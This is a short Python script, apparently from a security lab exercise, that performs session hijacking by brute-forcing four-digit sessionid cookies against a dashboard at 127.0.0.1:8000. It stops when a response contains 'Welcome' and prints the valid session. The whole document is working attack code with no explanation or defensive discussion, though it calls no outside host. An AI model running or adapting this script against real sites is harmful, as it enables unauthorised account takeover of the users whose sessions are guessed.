import requests
from bs4 import BeautifulSoup

# 2️⃣ Session Hijacking - Guessing 4-digit Session IDs
DASHBOARD_URL = "http://127.0.0.1:8000/dashboard/"

for session_id in range(1000, 9999):
    cookies = {"sessionid": str(session_id)}
    response = requests.get(DASHBOARD_URL, cookies=cookies)
    if "Welcome" in response.text:
        print(f"[+] Valid session found: sessionid={session_id}")
        break